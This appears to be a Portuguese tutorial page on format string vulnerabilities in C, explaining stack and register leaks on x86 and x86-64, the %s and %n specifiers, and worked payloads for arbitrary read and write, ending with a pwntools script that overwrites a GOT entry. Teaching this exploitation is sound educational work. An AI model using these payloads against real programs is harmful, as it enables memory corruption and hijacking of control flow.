---
title: "Format Strings"
sidebar_position: 2
---

Em C, as funções `printf`, `fprintf` ou qualquer outras parecidas recebem Format Specifiers e colocam variáveis nos lugares deles para imprimir ao usuário.

```C
int value = 1205;

printf("%x %x %x", value, value, value);

// Saída: 4b5 4b5 4b5
```

Mas e se não tivermos argumentos o suficiente para todos os format specifiers?

```C
int value = 1205;

printf("%x %x %x", value);

// Saída: 4b5 5659b000 565981b0
```

O `printf` espera a mesma quantidade de parâmetros que Format Specifiers, e apenas puxa esses parâmetros de onde a convenção de chamada diz que eles estariam (registradores e depois a stack). Ele não tem como saber quantos argumentos realmente foram passados. Se não há parâmetros suficientes, **a função vai pegar os próximos valores mesmo assim, vazando o conteúdo dos registradores e da stack**.

A vulnerabilidade aparece quando **o usuário controla a format string**: `printf(buffer)` em vez de `printf("%s", buffer)`. O mesmo vale para `sprintf`, `fprintf`, `snprintf`, `syslog`, etc.

## Aplicando Format Strings

Temos o seguinte programa em x86:

```C
#include <stdio.h>

int main(void) {
    char buffer[30];
    
    gets(buffer);

    printf(buffer);
    return 0;
}
```

Input: `%x %x %x %x %x`
Output: `f7f74080 0 5657b1c0 782573fc 20782520`

```
────────────────[ STACK ]────────────────
00:0000│ esp 0xffffcf10 —▸ 0xffffcf28 ◂— '%x %x %x %x %x'
01:0004│-0e4 0xffffcf14 —▸ 0xf7d843ac ◂— 0x74656e00
02:0008│-0e0 0xffffcf18 —▸ 0x8048288 ◂— '__libc_start_main'
03:000c│-0dc 0xffffcf1c —▸ 0x804918c (main+26) ◂— add ebx, 0x2e74
04:0010│-0d8 0xffffcf20 ◂— 0x7b1ea71
05:0014│-0d4 0xffffcf24 ◂— 0
06:0018│-0d0 0xffffcf28 ◂— '%x %x %x %x %x'
07:001c│-0cc 0xffffcf2c ◂— 'x %x %x %x'
```

Veja que o que foi vazado foi o **primeiro endereço a partir de esp em diante**: `esp+0x4`, `esp+0x8`,...

Fluxo do printf:

1. printf espera parâmetros após o formato na Stack
2. O primeiro parâmetro (**format string**) está no **topo da pilha** no momento da chamada
3. Os parâmetros seguintes (que deveriam ser os valores para %x) **estariam imediatamente após**

Para chamar `printf(buffer)`, o **compilador** precisa:

1. Empurrar os parâmetros na pilha
2. Chamar a função

Exemplo de preparo de chamada de `printf("%d %d", a, b)`:

```
; Supondo que buffer esteja em [ebp-30]
push b  (34)        ← terceiro parâmetro (empilhado primeiro: da direita para a esquerda)
push a  (99)        ← segundo parâmetro  
lea eax, [ebp-30]    ; eax recebe endereço do buffer (que contém "%d %d")
push eax         ← primeiro parâmetro (format string)
call printf          ; push return address (stack), jump printf (eip)
```

Após `push b, push a, push eax`, teremos a stack desse jeito:

```
(endereços altos)
+------------------+
| ret. add main    |
+------------------+
| ebp salvo        | ← EBP
+------------------+
| buffer[29]       | \
| ...              |  | buffer (variável local)
| buffer[0]="%d"   | /
+------------------+ 
| b                | ← ESP+8 (onde 2º %d vai buscar)
+------------------+ 
| a                | ← ESP+4 (onde 1º %d vai buscar)
+------------------+
| ponteiro p/ buffer| ← ESP APONTA AQUI! (primeiro parâmetro do printf)
+------------------+
(endereços baixos)
```

Após dar `call printf`, agora estamos no Stack Frame da função `printf`:

```
(endereços altos)
+-------------------+ 
| ...               | ↑
+-------------------+ 
| end. retorno main | 
+-------------------+ 
| ebp salvo         | ← EBP da main (antes do printf)
+-------------------+ 
| buffer[29]        | \
| ...               |  | Format String ← região local da main (antes do printf)
| buffer[0]="%x"    | /
+-------------------+
| ???               | ← EBP+16 (onde 2º %d vai buscar)
+-------------------+
| ???               | ← EBP+12 (onde 1º %d vai buscar)
+-------------------+ 
| ponteiro p/ buffer| ← EBP+8 do printf (Format String, 1º Parâmetro do printf)
+-------------------+ 
| ret. add printf   | ← EBP+4 do printf
+-------------------+ 
| ebp salvo (printf)| ← EBP do printf
+-------------------+ 
| vars locais printf| 
+-------------------+ ← ESP dentro do printf
(endereços baixos)
```

Agora imagine que a chamada foi `printf(buffer)`, sem `a` e `b`. O `printf` continua indo buscar o "1º %d" em `EBP+12` e o "2º %d" em `EBP+16`, só que agora o que está lá é o que estava na stack da `main` antes da chamada: lixo, variáveis locais, o próprio buffer...

A vulnerabilidade de format string **pode vazar TODA a região da pilha**, não importa se a variável tem "relação" com o printf ou não. Com `%x` suficientes, lemos desde o topo da stack no momento da chamada até o EBP da `main` (função que chamou `printf`), o endereço de retorno dela e além.

Se pensarmos como blocos, um `printf("%x")` imprime o conteúdo do primeiro bloco depois do ponteiro para a format string, ou seja, `ESP+4` no momento do `call`.

## Diferença entre 32-bit e 64-bit

### x86 (32-bit)
- Argumentos são passados na **stack**
- `printf` vai buscar o valor para o 1º `%x` logo depois do ponteiro para a format string, o 2º `%x` logo depois, e assim por diante

Logo após o `call printf` (antes do prólogo do `printf`):
```
ESP    → endereço de retorno
ESP+4  → ponteiro para a format string (1º argumento)
ESP+8  → onde o 1º %x vai buscar
ESP+12 → onde o 2º %x vai buscar, etc.
```

Depois do prólogo do `printf` (`push ebp; mov ebp, esp`), os mesmos valores ficam em `EBP+4`, `EBP+8`, `EBP+12`, `EBP+16`...

Assim, em 32 bits, **o 1º `%x` já é o primeiro valor da stack da função que chamou o `printf`**. Se o buffer é uma variável local dessa função, ele aparece depois de poucos `%x`.

### x86-64 (64-bit)

- Os primeiros argumentos são passados em registradores
- `printf` vai primeiro olhar nos registradores que armazenam parâmetros (`RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`)
- Só depois busca na stack

Lembrando a ordem de passagem de argumentos para registradores:

1. `RDI` (Endereço da Format String)
2. `RSI`  (Parâmetro 1)
3. `RDX` (Parâmetro 2)
4. `RCX` (...)
5. `R8`
6. `R9`
7. Stack (RSP+8, RSP+16, ...)

Se usarmos `printf("%x")`, veremos o que há de conteúdo no registrador `RSI`, que pode ser lixo de memória ou valor usado anteriormente pela função que fez a `call`.

Isso nem sempre é muito útil. Mas se usarmos `printf("%p %p %p %p %p %p %p")`, temos:

```
%p 1 → RSI (2º registrador)
%p 2 → RDX (3º registrador)  
%p 3 → RCX (4º registrador)
%p 4 → R8  (5º registrador)
%p 5 → R9  (6º registrador)
%p 6 → Stack: topo da stack no momento do call  ← AQUI COMEÇA A STACK!
%p 7 → Stack: próximos 8 bytes
```

Por isso, em 64 bits, **o 6º parâmetro é sempre o primeiro valor da stack**, e o buffer (se for local da função que chamou o `printf`) costuma aparecer a partir do 6º, 7º, 8º... parâmetro.

Outra diferença importante: em 64 bits, `%x` imprime só 4 bytes (um `int`). Para ver os 8 bytes de um endereço, use `%p` ou `%lx`.

## Tipos de Format Strings

- `%x` - Imprime conteúdo do bloco de memória em hexadecimal (4 bytes). `%p` imprime um ponteiro (8 bytes em 64 bits) com `0x` na frente. `%lx` imprime 8 bytes sem o `0x`.
```c
printf("%x");        // Vaza 4 bytes
printf("%08x");      // Vaza com padding (8 dígitos)
printf("%p");        // Vaza um ponteiro inteiro (o mais usado para leaks)
```
- `%s` - Imprime string até null byte. Ao receber um bloco da stack como parâmetro, tenta interpretar o conteúdo do bloco como ponteiro, indo até esse endereço e imprimindo o conteúdo como string.
  - Se argumento for endereço válido - Lê até null byte
  - Se for endereço inválido - Segmentation fault
  - Se controlarmos o argumento (colocando um endereço dentro do nosso próprio buffer e apontando para ele com `%N$s`), podemos ler a string de qualquer endereço: **leitura arbitrária**
```c
printf("%s", 0x404000);  // Lê string do endereço 0x404000
printf("%s");            // Tenta ler endereço da stack como ponteiro
```
- `%n` - Escreve o número de bytes impressos até agora no endereço dado. Não imprime texto, mas escreve em um endereço de memória: **escrita arbitrária**.
  - `%n`- Escreve int (4 bytes)
  - `%hn` - Escreve short (2 bytes)
  - `%hhn` - Escreve char (1 byte)
```C
printf("%100x%n", 0, &var);  // Imprime 100 caracteres e escreve 100 em var
// (controlando a quantidade de caracteres impressos, você escreve o valor que quiser)
```
- `%N$x` / `%N$p` / `%N$s` / `%N$n` - Acesso direto ao N-ésimo parâmetro, sem precisar escrever N format specifiers. Ex: `%7$p` imprime o 7º parâmetro. Essencial para apontar o `%n` para o endereço que colocamos no buffer.
- `%Nc` / `%Nx` - Largura mínima: `%100c` imprime 100 caracteres (99 espaços + o caractere). É a forma de controlar o contador do `%n` sem precisar enviar 100 bytes de input.

## Exemplo de payload

Os exemplos abaixo são para um binário de 64 bits em que descobrimos que **o início do nosso buffer é o 7º parâmetro** do `printf`.

```
# 1. Reconhecimento: Onde está nosso input? (procurar os AAAA = 0x41414141 na saída)
AAAA.%p.%p.%p.%p.%p.%p.%p.%p
# ou, um de cada vez:
AAAA%7$p    → se imprimir 0x...41414141, o buffer começa no 7º parâmetro

# 2. Leak de endereços (bypass de PIE/ASLR): endereços da stack (0x7ffd...),
#    da libc (0x7f...) e do binário aparecem no meio dos valores
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p

# 3. Arbitrary Read: ler a string que está em 0x404000
# A format string vem primeiro e o endereço vem depois, alinhado em 8 bytes:
# "%8$s" + 4 bytes de padding = 8 bytes = parâmetro 7
# o endereço 0x404000 (8 bytes) = parâmetro 8, por isso o %8$s
%8$sAAAA\x00\x40\x40\x00\x00\x00\x00\x00
```

Repare que, em 64 bits, os endereços têm bytes nulos (`\x00`), e o `printf` para de ler a format string no primeiro `\0`. Por isso **os endereços vão no fim do payload**, depois de todos os format specifiers (em 32 bits, `0x0804c00c` não tem byte nulo e o endereço pode vir no começo, como nos tutoriais antigos).

```
# 4. Arbitrary Write: escrever 0xdeadbeef em 0x404020 (uma entrada da GOT, por exemplo)
# Usamos %hn para escrever 2 bytes de cada vez: 0xbeef em 0x404020 e 0xdead em 0x404022.
# O %n escreve o total de caracteres impressos até ali, então escrevemos primeiro
# o menor valor (0xbeef = 48879) e depois completamos até o maior (0xdead = 57005).

%.48863x%11$hn%.8142x%12$hn      # 27 bytes de format string
AAAAA                            # 5 bytes de padding, para completar 32 bytes = 4 parâmetros (7, 8, 9 e 10)
\x20\x40\x40\x00\x00\x00\x00\x00   # 11º parâmetro: 0x404020
\x22\x40\x40\x00\x00\x00\x00\x00   # 12º parâmetro: 0x404022
```

- `%.48863x` imprime 48863 caracteres = `0xbeef`. (O padding e os endereços ficam no fim da string e só são impressos **depois** dos `%hn`, então não entram na conta)
- `%11$hn`: escreve 2 bytes com o total impresso até agora (`0xbeef`) no endereço do 11º parâmetro (`0x404020`)
- `%.8142x` imprime mais 8142 caracteres: total 57005 = `0xdead`
- `%12$hn`: escreve `0xdead` no endereço do 12º parâmetro (`0x404022`)
- Resultado na memória: `ef be ad de` = `0xdeadbeef` em little endian

Fazer essa conta na mão é chato e propenso a erro. O pwntools faz isso automaticamente, como veremos abaixo.

## Arbitrary Write (%) com Pwntools

O pwntools possui uma função para facilitar o arbitrary write por `%n`, a `fmtstr_payload`, e tende a ser muito mais fácil de utilizar.

```py
from pwn import *

context.binary = elf = ELF('./vuln')
p = process()

offset = 7  # Posição onde o buffer começa nos argumentos do printf
# Descubra enviando "AAAA%7$p" (ou AAAA.%p.%p.%p...) e vendo em qual posição aparece 0x41414141

writes = {
    elf.got['puts']: elf.sym['win']  # {endereço_alvo: novo_valor}
}

# Gera e envia o payload (os endereços já vão no fim, alinhados)
payload = fmtstr_payload(offset, writes)
p.sendline(payload)
p.interactive()
```

Se o offset for difícil de achar na mão, a classe `FmtStr` descobre sozinha:

```py
def send_fmt(payload):
    p.sendline(payload)
    return p.recvline()   # precisa devolver a saída do printf

fmt = FmtStr(execute_fmt=send_fmt)
print(fmt.offset)                        # offset encontrado automaticamente
fmt.write(elf.got['puts'], elf.sym['win'])
fmt.execute_writes()
```

Veja um exemplo completo em [GOT Overwrite](./got-overwrite.md).